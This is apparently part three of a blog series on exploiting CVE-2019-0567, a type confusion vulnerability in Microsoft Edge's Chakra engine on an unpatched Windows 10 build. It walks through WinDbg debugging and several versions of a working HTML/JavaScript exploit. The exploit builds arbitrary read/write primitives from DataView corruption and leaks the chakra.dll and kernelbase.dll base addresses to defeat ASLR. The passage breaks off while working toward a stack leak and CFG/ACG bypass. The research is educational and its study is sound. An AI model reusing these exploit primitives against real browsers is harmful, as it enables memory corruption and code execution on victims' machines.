---
title: "Exploit Development: Browser Exploitation on Windows - CVE-2019-0567, A Microsoft Edge Type Confusion Vulnerability (Part 3)"
date: 2022-04-07
tags: [posts]
excerpt: "Porting part 2's ChakraCore exploit to Microsoft Edge while defeating ASLR, DEP, CFG, ACG, CIG, and other mitigations."
---
Introduction
---
In [part one](https://connormcgarr.github.io/type-confusion-part-1/) of this blog series on "modern" browser exploitation, targeting Windows, we took a look at how JavaScript manages objects in memory via the Chakra/ChakraCore JavaScript engine and saw how type confusion vulnerabilities arise. In [part two](https://connormcgarr.github.io/type-confusion-part-2/) we took a look at Chakra/ChakraCore exploit primitives and turning our type confusion proof-of-concept into a working exploit on ChakraCore, while dealing with ASLR, DEP, and CFG. In part three, this post, we will close out this series by making a few minor tweaks to our exploit primitives to go from ChakraCore to Chakra (the closed-source version of ChakraCore which Microsoft Edge runs on in various versions of Windows 10). After porting our exploit primitives to Edge, we will then gain full code execution while bypassing Arbitrary Code Guard (ACG), Code Integrity Guard (CIG), and other minor mitigations in Edge, most notably "no child processes" in Edge. The final result will be a working exploit that can gain code execution with ASLR, DEP, CFG, ACG, CIG, and other mitigations enabled.

From ChakraCore to Chakra
---
Since we already have a working exploit for ChakraCore, we now need to port it to Edge. As we know, Chakra (Edge) is the "closed-source" variant of ChakraCore. There are not many differences between how our exploits will look (in terms of exploit primitives). The only thing we need to do is update a few of the offsets from our ChakraCore exploit to be compliant with the version of Edge we are exploiting. Again, as mentioned in part one, we will be using an _UNPATCHED_ version of Windows 10 1703 (RS2). Below is an output of `winver.exe`, which shows the build number (`15063.0`) we are using. The version of Edge we are using has no patches and no service packs installed.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion1.png" alt="">

Moving on, below you can find the code that we will be using as a template for our exploitation. We will name this file `exploit.html` and save it to our Desktop (feel free to save it anywhere you would like).

```html
<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");
}
</script>
```

Nothing about this code differs in the slightest from our previous `exploit.js` code, except for the fact we are now using an HTML, as obviously this is the type of file Edge expects as it's a web browser. This also means that we have replaced `print()` functions with proper `document.write()` HTML methods in order to print our exploit output to the screen. We have also added a `<script></script>` tag to allow us to execute our malicious JavaScript in the browser. Additionally, we added functionality in the `<button onclick="main()">Click me to exploit CVE-2019-0567!</button>` line, where our exploit won't be executed as soon as the web page is opened. Instead, this button allows us choose when we want to detonate our exploit. This will aid us in debugging as we will see shortly.

Once we have saved `exploit.html`, we can double-click on it and select Microsoft Edge as the application we want to open it with. From there, we should be presented with our `Click me to exploit CVE-2019-0567` button.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion2.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion3.png" alt="">

After we have loaded the web page, we can then click on the button to run the code presented above for `exploit.html`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion4.png" alt="">

As we can see, everything works as expected (per our post number two in this blog series) and we leak the `vftable` from one of our `DataView` objects, from our exploit primitive, which is a pointer into `chakra.dll`. However, as we are exploiting Edge itself now and not the ChakraCore engine, computation of the base address of `chakra.dll` will be _slightly_ different. To do this, we need to debug Microsoft Edge in order to compute the distance between our leaked address and `chakra.dll`'s base address. With that said, we will need to talk about debugging Edge in order to compute the base address of `chakra.dll`.

We will begin by making use of [Process Hacker](https://processhacker.sourceforge.io/downloads.php) to aid in our debugging. After downloading Process Hacker, we can go ahead and start it.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion5.png" alt="">

After starting Process Hacker, let's go ahead and re-open `exploit.html` but _do not_ click on the `Click me to exploit CVE-2019-0567` button yet.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion3.png" alt="">

Coming back to Process Hacker, we can see two `MicrosoftEdgeCP.exe` processes and a `MicrosoftEdge.exe` process. 

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion6.png" alt="">

Where do these various processes come from? As the `CP` in `MicrosoftEdgeCP.exe` infers, these are Microsoft Edge content processes. A content process, also known as a renderer process, is the actual component of the browser which executes the JavaScript, HTML, and CSS code a user interfaces with. In this case, we can see two `MicrosoftEdgeCP.exe` processes. One of these processes refers to the actual content we are seeing (the actual `exploit.html` web page). The other `MicrosoftEdgeCP.exe` process is technically not a content process, per se, and is actually the out-of-process JIT server which we talked about previously in this blog series. What does this actually mean?

JIT'd code is code that is generated as readable, writable, and executable (RWX). This is also known as "dynamic code" which is generated at runtime, and it doesn't exist when the Microsoft Edge processes are spawned. We will talk about Arbitrary Code Guard (ACG) in a bit, but at a high level ACG prohibits any dynamic code (amongst other nuances we will speak of at the appropriate time) from being generated which is readable, writable, and executable (RWX). Since ACG is a mitigation, which was actually developed with browser exploitation and Edge in mind, there is a slight usability issue. Since JIT'd code is a _massive_ component of a modern day browser, this automatically makes ACG incompatible with Edge. If ACG is enabled, then how can JIT'd code be generated, as it is RWX? The solution to this problem is by leveraging an out-of-process JIT server (located in the second `MicrosoftEdgeCP.exe` process).

This JIT server process has Arbitrary Code Guard _disabled_. The reason for this is because the JIT process doesn't handle any execution of "untrusted" JavaScript code - meaning the JIT server can't really be exploited by browser exploitation-related primitives, like a type confusion vulnerability (we will prove this assumption false with our ACG bypass). The reason is that since the JIT process doesn't execute any of that JavaScript, HTML, or CSS code, meaning we can infer the JIT server doesn't handled any "untrusted code", a.k.a JavaScript provided by a given web page, we can infer that any code running within the JIT server is "trusted" code and therefore we don't need to place "unnecessary constraints" on the process. With the out-of-process JIT server having no ACG-enablement, this means the JIT server process is now compatible with "JIT" and can generate the needed RWX code that JIT requires. The main issue, however, is how do we get this code (which is currently in a separate process) into the appropriate content process where it will actually be executed? 

The way this works is that the out-of-process JIT server will actually take any JIT'd code that needs to be executed, and it will inject it into the content processes that contain the JavaScript code to be executed with proper permissions that are ACG complaint (generally readable/executable). So, at a high level, this out-of-process JIT server performs process injection to map the JIT'd code into the content processes (which has ACG enabled). This allows the Edge content processes, which are responsible for handling untrusted code like a web page that hosts malicious JavaScript to perform memory corruption (e.g. `exploit.html`), to have full ACG support.

Lastly, we have the `MicrosoftEdge.exe` process which is known as the browser process. It is the "main" process which helps to manage things like network requests and file access. 

Armed with the above information, let's now turn our attention back to Process Hacker.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion6.png" alt="">

The obvious point we can make is that when we do our exploit debugging, we know the content process is responsible for execution of the JavaScript code within our web page - meaning that it is the process we need to debug as it will be responsible for execution of our exploit. However, since the out-of-process JIT server is technically named as a content process, this makes for two instances of `MicrosoftEdgeCP.exe`. How do we know which is the out-of-process JIT server and which is the actual content process? This probably isn't the best way to tell, but the way I figured this out with approximately 100% accuracy is by looking at the two content processes (`MicrosoftEdgeCP.exe`) and determining which one uses up more RAM. In my testing, the process which uses up more RAM is the target process for debugging (as it is significantly more, and makes sense as the content process has to load JavaScript, HTML, and CSS code into memory for execution). With that in mind, we can break down the process tree as such (based on the Process Hacker image above):

1. `MicrosoftEdge.exe` - PID `3740` (browser process)
2. `MicrosoftEdgeCP.exe` - PID `2668` (out-of-process JIT server)
3. `MicrosoftEdgeCP.exe` - PID `2512` (content process - our "exploiting process" we want to debug).

With the aforementioned knowledge we can attach PID `2512` (our content process, which will likely differ on your machine) to WinDbg and know that this is the process responsible for execution of our JavaScript code. More importantly, this process loads the Chakra JavaScript engine DLL, `chakra.dll`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion7.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion8.png" alt="">

After confirming `chakra.dll` is loaded into the process space, we then can click out `Click me to exploit CVE-2019-0567` button (you may have to click it twice). This will run our exploit, and from here we can calculate the distance to `chakra.dll` in order to compute the base of `chakra.dll`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion9.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion10.png" alt="">

As we can see above, the leaked `vftable` pointer is `0x5d0bf8` bytes away from `chakra.dll`. We can then update our exploit script to the following code, and confirm this to be the case.

```html
<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");

    // Store the base of chakra.dll
    chakraLo = vtableLo - 0x5d0bf8;
    chakraHigh = vtableHigh;

    // Print update
    document.write("[+] chakra.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    document.write("<br>");
}
</script>
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion11.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion8.png" alt="">

After computing the base address of `chakra.dll` the next thing we need to do is, as shown in part two, leak an import address table (IAT) entry that points to `kernel32.dll` (in this case `kernelbase.dll`, which contains all of the functionality of `kernel32.dll`).

Using the same debugging session, or a new one if you prefer (following the aforementioned steps to locate the content process), we can locate the IAT for `chakra.dll` with the `!dh` command.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion12.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion13.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion14.png" alt="">

If we dive a bit deeper into the IAT, we can see there are several pointers to `kernelbase.dll`, which contains many of the important APIs such as `VirtualProtect` we need to bypass DEP and ACG. Specifically, for our exploit, we will go ahead and extract the pointer to `kernelbase!DuplicateHandle` as our `kernelbase.dll` leak, as we will need this API in the future for our ACG bypass.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion15.png" alt="">

What this means is that we can use our read primitive to read what `chakra_base+0x5ee2b8` points to (which is a pointer into `kernelbase.dll`). We then can compute the base address of `kernelbase.dll` by subtracting the offset to `DuplicateHandle` from the base of `kernelbase.dll` in the debugger.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion16.png" alt="">

We now know that `DuplicateHandle` is `0x18de0` bytes away from `kernelbase.dll`'s base address. Armed with the following information, we can update `exploit.html` as follows and detonate it.

```html
<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");

    // Store the base of chakra.dll
    chakraLo = vtableLo - 0x5d0bf8;
    chakraHigh = vtableHigh;

    // Print update
    document.write("[+] chakra.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    document.write("<br>");

    // Leak a pointer to kernelbase.dll (KERNELBASE!DuplicateHandle) from the IAT of chakra.dll
    // chakra+0x5ee2b8 points to KERNELBASE!DuplicateHandle
    kernelbaseLeak = read64(chakraLo+0x5ee2b8, chakraHigh);

    // KERNELBASE!DuplicateHandle is 0x18de0 away from kernelbase.dll's base address
    kernelbaseLo = kernelbaseLeak[0]-0x18de0;
    kernelbaseHigh = kernelbaseLeak[1];

    // Store the pointer to KERNELBASE!DuplicateHandle (needed for our ACG bypass) into a more aptly named variable
    var duplicateHandle = new Uint32Array(0x4);
    duplicateHandle[0] = kernelbaseLeak[0];
    duplicateHandle[1] = kernelbaseLeak[1];

    // Print update
    document.write("[+] kernelbase.dll base address: 0x" + hex(kernelbaseHigh) + hex(kernelbaseLo));
    document.write("<br>");
}
</script>
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion17.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion18.png" alt="">

We are now almost done porting our exploit primitives to Edge from ChakraCore. As we can recall from our ChakraCore exploit, the last thing we need to do now is leak a stack address/the stack in order to bypass CFG for control-flow hijacking and code execution.

Recall that this information derives from [this Google Project Zero issue](https://bugs.chromium.org/p/project-zero/issues/detail?id=1360). As we can recall with our ChakraCore exploit, we computed these offsets in WinDbg and determined that ChakraCore leveraged _slightly_ different offsets. However, since we are now targeting Edge, we can update the offsets to those mentioned by Ivan Fratric in this issue.

However, even though the `type->scriptContext->threadContext` offsets will be the ones mentioned in the Project Zero issue, the stack address offset is _slightly_ different. We will go ahead and debug this with `alert()` statements.

We know we have to leak a `type` pointer (which we already have stored in `exploit.html` the same way as part two of this blog series) in order to leak a stack address. Let's update our `exploit.html` with a few items to aid in our debugging for leaking a stack address.

```html
<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");

    // Store the base of chakra.dll
    chakraLo = vtableLo - 0x5d0bf8;
    chakraHigh = vtableHigh;

    // Print update
    document.write("[+] chakra.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    document.write("<br>");

    // Leak a pointer to kernelbase.dll (KERNELBASE!DuplicateHandle) from the IAT of chakra.dll
    // chakra+0x5ee2b8 points to KERNELBASE!DuplicateHandle
    kernelbaseLeak = read64(chakraLo+0x5ee2b8, chakraHigh);

    // KERNELBASE!DuplicateHandle is 0x18de0 away from kernelbase.dll's base address
    kernelbaseLo = kernelbaseLeak[0]-x18de0;
    kernelbaseHigh = kernelbaseLeak[1];

    // Store the pointer to KERNELBASE!DuplicateHandle (needed for our ACG bypass) into a more aptly named variable
    var duplicateHandle = new Uint32Array(0x4);
    duplicateHandle[0] = kernelbaseLeak[0];
    duplicateHandle[1] = kernelbaseLeak[1];

    // Print update
    document.write("[+] kernelbase.dll base address: 0x" + hex(kernelbaseHigh) + hex(kernelbaseLo));
    document.write("<br>");

    // ---------------------------------------------------------------------------------------------

    // Print update with our type pointer
    document.write("[+] type pointer: 0x" + hex(typeHigh) + hex(typeLo));
    document.write("<br>");

    // Spawn an alert dialogue to pause execution
    alert("DEBUG");
}
</script>
```

As we can see, we have added a `document.write()` call to print out the address of our `type` pointer (from which we will leak a stack address) and then we also added an `alert()` call to create an "alert" dialogue. Since JavaScript will use temporary virtual memory (e.g. memory that isn't really backed by disk in the form of a `0x7fff` address that is backed by a loaded DLL) for objects, this address is only "consistent" for the duration of the process. Think of this in terms of ASLR - when, on Windows, you reboot the system, you can expect images to be loaded at different addresses. This is synonymous with the longevity of the address/address space used for JavaScript objects, except that it is on a "per-script basis" and not a per-boot basis ("per-script" basis is a made-up word by myself to represent the fact the address of a JavaScript object will change after each time the JavaScript code is ran). This is the reason we have the `document.write()` call and `alert()` call. The `document.write()` call will give us the address of our `type` object, and the `alert()` dialogue will actually work, in essence, like a breakpoint in that it will pause execution of JavaScript, HTML, or CSS code until the "alert" dialogue has been dealt with. In other words, the JavaScript code cannot be fully executed until the dialogue is dealt with, meaning all of the JavaScript code is loaded into the content process and cannot be released until it is dealt with. This will allow us examine the `type` pointer _before_ it goes out of scope, and so we can examine it. We will use this same "setup" (e.g. `alert()` calls) to our advantage in debugging in the future.

If we run our exploit two separate times, we can confirm our theory about the `type` pointer changing addresses each time the JavaScript executes

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion19.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion20.png" alt="">

Now, for "real" this time, let's open up `exploit.html` in Edge and click the `Click me to exploit CVE-2019-0567` button. This should bring up our "alert" dialogue.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion21.png" alt="">

As we can see, the `type` pointer is located at `0x1ca40d69100` (note you won't be able to use copy and paste with the dialogue available, so you will have to manually type this value). Now that we know the address of the `type` pointer, we can use Process Hacker to locate our content process.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion22.png" alt="">

As we can see, the content process which uses the most RAM is PID `6464`. This is our content process, where our exploit is currently executing (although paused). We now can use WinDbg to attach to the process and examine the memory contents of `0x1ca40d69100`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion23.png" alt="">

After inspecting the memory contents, we can confirm that this is a valid address - meaning our `type` pointer hasn't gone out of scope! Although a bit of an arduous process, this is how we can successfully debug Edge for our exploit development!

Using the Project Zero issue as a guide, and leveraging the process outlined in part two of this blog series, we can talk various pointers within this structure to fetch a stack address!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion24.png" alt="">

The Google Project Zero [issue](https://bugs.chromium.org/p/project-zero/issues/detail?id=1360) explains that we essentially can just walk the `type` pointer to extract a `ScriptContext` structure which, in turn, contains `ThreadContext`. The `ThreadContext` structure is responsible, as we have seen, for storing various stack addresses. Here are the offsets:

1. `type + 0x8` = `JavaScriptLibrary`
2. `JavaScriptLibrary + 0x430` = `ScriptContext`
3. `ScriptContext + 0x5c0` = `ThreadContext`

In our case, the `ThreadContext` structure is located at `0x1ca3d72a000`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion25.png" alt="">

Previously, we leaked the `stackLimitForCurrentThread` member of `ThreadContext`, which gave us essentially the stack limit for the exploiting thread. However, take a look at this address within Edge (located at `ThreadContext + 0x4f0`)

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion26.png" alt="">

If we try to examine the memory contents of this address, we can see they are not committed to memory. This obviously means this address doesn't fall within the bounds of the TEB's known stack address(es) for our current thread.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion27.png" alt="">

As we can recall from part two, this was also the case. However, in ChakraCore, we could compute the offset from the leaked `stackLimitForCurrentThread` _consistently_ between exploit attempts. Let's compute the distance from our leaked `stackLimitForCurrentThread` with the actual stack limit from the TEB.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion28.png" alt="">

Here, at this point in the exploit, the leaked stack address is `0x1cf0000` bytes away from the _actual_ stack limit we leaked via the TEB. Let's exit out of WinDbg and re-run our exploit, while also leaking our stack address within WinDbg.

Our `type` pointer is located at `0x157acb19100`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion29.png" alt="">

After attaching Edge to WinDbg and walking the `type` object, we can see our leaked stack address via `stackLimitForCurrentThread`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion30.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion31.png" alt="">

As we can see above, when computing the offset, our offset has changed to being `0x1c90000` bytes away from the actual stack limit. This poses a problem for us, as we cannot reliable compute the offset to the stack limit. Since the stack limit saved in the `ThreadContext` structure (`stackForCurrentThreadLimit`) is not committed to memory, we will actually get an access violation when attempting to dereference this memory. This means our exploit would be killed, meaning we also can't "guess" the offset if we want our exploit to be reliable.

Before I pose the solution, I wanted to touch on something I first tried. Within the `ThreadContext` structure, there is a global variable named `globalListFirst`. This seems to be a linked-list within a `ThreadContext` structure which is used to track _other_ instances of a `ThreadContext` structure. At an offset of `0x10` within this list (consistently, I found, in every attempt I made) there is actually a pointer to the heap.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion32.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion33.png" alt="">

Since it is possible via `stackLimitForCurrentThread` to at least leak an address _around_ the current stack limit (with the upper 32-bits being the same across all stack addresses), and although there is a degree of variance between the offset from `stackLimitForCurrentThread` and the actual current stack limit (around `0x1cX0000` bytes as we saw between our two stack leak attempts), I used my knowledge of the heap to do the following:

